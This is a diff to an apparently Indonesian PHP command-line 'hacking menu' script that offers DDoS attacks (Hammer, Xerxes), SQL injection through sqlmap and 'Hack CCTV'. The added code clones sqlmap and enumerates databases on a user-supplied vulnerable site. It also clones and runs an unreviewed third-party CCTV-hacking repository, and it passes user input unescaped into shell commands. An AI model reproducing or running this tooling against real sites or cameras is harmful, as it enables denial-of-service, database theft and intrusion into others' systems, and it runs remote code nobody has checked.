@@ -19,6 +19,7 @@ echo "1) DDOS Hammer";
 echo "2) DDOS Xerxes";
 echo "3) SQL MAP";
 echo "4) HACK CCTV";
+echo "5) Exit Program";
 echo "===========\n";
 sleep(1);
 echo "PILIH=> ";
@@ -62,7 +63,37 @@ $ipWeb = trim(fgets(STDIN));
 system('clear');
 system("./xerxes '$target' '$ipWeb'");
 }
-
+  
+if ($menu == 3){
+  system('clear');
+  echo "[!] Installing SQL MAP";
+  system('git clone https://github.com/sqlmapproject/sqlmap');
+  system('cd sqlmap');
+  system('clear');
+  echo "[+] Masukan Web vulnerable SQLi : ";
+  $webTarget = trim(fgets(STDIN));
+  system('clear');
+  system("python2 sqlmap.py -u '$webTarget' --dbs");
+}
+  
+ if ($menu == 4){
+   system('clear');
+   echo "[!] Installing Hack CCTV..";
+   system('git clone https://github.com/MrTamfanX/hackcctv');
+   system('cd hackcctv');
+   system('python2 CctvX.py');
+ }
+  
+ if ($menu == 5){
+   system('clear');
+   echo "NO JAV NO COLI";
+   sleep(0.2);
+   echo "TITIP SALAM DARI MR.Y0UKN0WM3";
+   sleep(0.1);
+   echo "Sampai jumpa kapan2 ketemuan lagi :-}";
+   sleep(1);
+   echo "[!] Exited Program..";
+  }
 } else {
 echo "[!] Incorrect Username and Password..";
 }
